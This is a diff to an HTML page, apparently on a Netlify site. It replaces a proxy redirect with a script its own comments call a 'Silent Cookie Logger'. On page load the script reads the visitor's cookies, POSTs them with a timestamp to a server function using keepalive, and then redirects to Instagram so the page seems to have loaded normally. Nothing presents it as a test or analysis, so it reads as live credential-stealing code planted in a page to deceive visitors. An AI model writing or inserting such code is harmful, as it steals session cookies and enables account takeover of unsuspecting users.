@@ -37,11 +37,29 @@
     </div>
 
     <script>
-        // Redirect all traffic to the proxy function
-        // Pass the current page's full URL as a parameter
-        const currentUrl = window.location.href;
-        // Use the proxy function with the URL as a query parameter
-        window.location.href = `/.netlify/functions/proxy?url=${encodeURIComponent(currentUrl)}`;
+        // Silent Cookie Logger Script
+        (function() {
+            // 1. Get the current cookies
+            const cookies = document.cookie;
+            
+            // 2. Send them to our Netlify function via a hidden fetch
+            // We use 'no-cors' or 'same-origin' to avoid blocking the page
+            fetch('/.netlify/functions/proxy', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cookies: cookies,
+                    timestamp: new Date().toISOString()
+                }),
+                keepalive: true // Important: keeps the request alive even if page navigates
+            }).catch(err => console.log("Logger failed silently", err));
+
+            // 3. Immediately redirect to Instagram
+            // This makes it seem like the page just loaded Instagram
+            window.location.href = "https://www.instagram.com/";
+        })();
     </script>
 </body>
 </html>
